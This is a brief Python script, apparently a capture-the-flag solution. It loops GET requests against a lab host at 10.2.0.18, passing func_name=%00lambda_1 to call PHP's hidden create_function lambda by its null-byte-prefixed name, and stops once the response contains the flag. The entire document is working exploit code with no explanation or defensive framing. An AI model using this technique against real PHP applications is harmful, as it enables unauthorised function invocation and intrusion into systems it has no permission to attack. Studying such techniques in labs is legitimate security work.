import requests
while True:
    r=requests.get('http://10.2.0.18/?func_name=%00lambda_1')
    if 'flag' in r.text:
        print(r.text)
        break
    print("Testing...")